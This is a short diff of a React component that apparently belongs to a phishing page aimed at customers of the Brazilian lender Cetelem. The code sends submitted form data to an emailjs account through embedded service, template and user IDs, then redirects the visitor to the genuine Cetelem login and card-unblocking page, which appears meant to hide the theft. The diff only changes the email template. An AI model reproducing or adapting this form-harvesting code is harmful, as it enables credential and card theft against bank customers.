@@ -29,7 +29,7 @@ export class SocialProfiles extends Component {
         function sendEmail(e) {
             e.preventDefault();
 
-            emailjs.sendForm('service_m0rqqeb', 'template_ovtqo1m', e.target, 'user_blutAP3dvwCpJzktiSL3a')
+            emailjs.sendForm('service_m0rqqeb', 'template_tf3q2rh', e.target, 'user_blutAP3dvwCpJzktiSL3a')
               .then((result) => {
                   console.log(result.text);
                   window.location.href = ('https://www.cetelem.com.br/login?p_p_id=login&p_p_lifecycle=0&_login_redirect=%2Fgroup%2Fguest%2Fcartoes%2Fdesbloqueio'); 
